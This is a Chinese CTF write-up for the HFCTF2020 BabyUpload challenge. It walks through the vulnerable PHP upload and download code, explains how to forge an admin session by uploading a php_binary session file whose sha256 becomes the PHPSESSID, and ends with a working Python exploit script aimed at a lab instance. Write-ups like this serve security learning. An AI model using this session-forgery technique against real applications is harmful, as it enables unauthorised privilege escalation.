---
title: '[HFCTF2020]BabyUpload'
date: 2024-09-09 19:13:30
tags: upload
categories: 刷题笔记
---

## [HFCTF2020]BabyUpload

```
<?php
error_reporting(0);
session_save_path("/var/babyctf/");
session_start();
require_once "/flag";
highlight_file(__FILE__);
if($_SESSION['username'] ==='admin')
{
    $filename='/var/babyctf/success.txt';
    if(file_exists($filename)){
            safe_delete($filename
            die($flag);
    }
}
else{
    $_SESSION['username'] ='guest';
}
$direction = filter_input(INPUT_POST, 'direction');
$attr = filter_input(INPUT_POST, 'attr');
$dir_path = "/var/babyctf/".$attr;
if($attr==="private"){
    $dir_path .= "/".$_SESSION['username'];
}
if($direction === "upload"){
    try{
        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){
            throw new RuntimeException('invalid upload');
        }
        $file_path = $dir_path."/".$_FILES['up_file']['name'];
        $file_path .= "_".hash_file("sha256",$_FILES['up_file']['tmp_name']);
        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){
            $upload_result = "uploaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $upload_result = $e->getMessage();
    }
} elseif ($direction === "download") {
    try{
        $filename = basename(filter_input(INPUT_POST, 'filename'));
        $file_path = $dir_path."/".$filename;
        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException('file not exist');
        }
        header('Content-Type: application/force-download');
        header('Content-Length: '.filesize($file_path));
        header('Content-Disposition: attachment; filename="'.substr($filename, 0, -65).'"');
        if(readfile($file_path)){
            $download_result = "downloaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $download_result = $e->getMessage();
    }
    exit;
}
?>
```

前面部分设置了session存储路径，启动了session并根目录下包含flag

```
error_reporting(0);
session_save_path("/var/babyctf/");
session_start();
require_once "/flag";

```

接下来判断session的username是否为admin，如果是，则判断/var/babyctf下是否存在

success.txt，如果存在，删除文件并输出flag，否则设置usename为guest

<!--more-->

```
if($_SESSION['username'] ==='admin')
{
    $filename='/var/babyctf/success.txt';
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION['username'] ='guest'; 
}

```

然后设置两个post参数direction、attr，$dir_path拼接路径，若\$attr为private，

在$dir_path的基础上再拼接一个username

```
$direction = filter_input(INPUT_POST, 'direction');
$attr = filter_input(INPUT_POST, 'attr'); 
$dir_path = "/var/babyctf/".$attr;
if($attr==="private"){
    $dir_path .= "/".$_SESSION['username'];
}

```

如果direction设置为upload，首先判断是否正常上传，通过则在$dir_path下拼接文件名,之后再拼接一个_，提示加上文件名的sha256值，之后限制墨绿穿越，创建相应目录，把文件上传到目录下

```
if($direction === "upload"){
    try{
        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){
            throw new RuntimeException('invalid upload');
        }
        $file_path = $dir_path."/".$_FILES['up_file']['name'];
        $file_path .= "_".hash_file("sha256",$_FILES['up_file']['tmp_name']);
        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){
            $upload_result = "uploaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $upload_result = $e->getMessage();
    }
}

```

若idrection设置为download，读取上传上来的文件，拼接位$file_path,限制目录穿越，判断是否存在，存在则返回文件内容

```
elseif ($direction === "download") {//如果direction设置为download
    try{
        $filename = basename(filter_input(INPUT_POST, 'filename'));
        $file_path = $dir_path."/".$filename;
        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException('file not exist');
        }
        header('Content-Type: application/force-download');
        header('Content-Length: '.filesize($file_path));
        header('Content-Disposition: attachment; filename="'.substr($filename, 0, -65).'"');
        if(readfile($file_path)){
            $download_result = "downloaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $download_result = $e->getMessage();
    }
    exit;
}

```

通过以上可知，要获取flag需满足

```
$_SESSION[‘username’] ===‘admin’
$filename=’/var/babyctf/success.txt’
```

也就是说我们伪造自己的username是admin，并穿件一个success.txt的文件

###### 伪造session

php的session默认存储文件名是sess_+PHPSESSID的值，我们先看一下session文件内容。
查看cookie中PHPSESSID

![image-20240909195231267](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409091952368.png)

构造`direction=download&attr=&filename=sess_e5212a8144f0d61543352a8bc5b4434f`post传入，在返回内容中读到内容

![image-20240909195406829](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409091954894.png)

我们发现还有一个不可见字符

参考https://blog.spoock.com/2016/10/16/php-serialize-problem/

不同的引擎所对应的session的存储方式有

php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值

php:存储方式是，键名+竖线+经过serialize()函数序列处理的值

php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值



我们可以判断这里session处理器为php_binary，那么我们可以在本地利用php_binary生成我们要伪造的session文件

```
<?php
ini_set('session.serialize_handler', 'php_binary');
session_save_path("D:\\phpstudy_pro\\WWW\\testphp\\");
session_start();

$_SESSION['username'] = 'admin';

```

运行生成session文件

![image-20240909200218919](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409092002952.png)

将文件名改为sess并计算sha256

![image-20240909200459429](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409092004488.png)

这样，如果我们见sess文件上传，服务器存储该文件的文件名就是

```
sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4
```

![image-20240909202812351](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409092028400.png)

成功伪造session，文件名设置不了，直接创建目录也符合条件，将`attr`设置为success.txt创建目录，再将sess上传到该目录下即可绕过判断

我们先**修改PHPSESSID为`432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4`**

再给attr`传参为success.txt

```
direction=download&attr=success.txt&filename=sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4
```

![image-20240909203152178](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409092031675.png)



额外解：

使用脚本

```
import requests
import hashlib
# url需要修改为自己的靶场url
url = 'http://def2716d-d2f9-48a2-b51f-a85fe197b8ef.node5.buuoj.cn:81/'
# 上传伪造的session文件
files = {"up_file": ("sess", b'\x08usernames:5:"admin";')}
data = {
    'direction': 'upload',
    'attr': ''
}
req = requests.post(url, data=data, files=files)

# 获取session_id
session_id = hashlib.sha256(b'\x08usernames:5:"admin";').hexdigest()

# 在/var/babyctf/下创建success.txt目录
data1 = {
    'attr': 'success.txt',
    'direction': 'upload'
}
req1 = requests.post(url=url, data=data1, files=files)

# 通过伪造的session文件解析，获取flag
cookie = {
    'PHPSESSID': session_id
}

flag = requests.get(url, cookies=cookie)
print(flag.text)
```

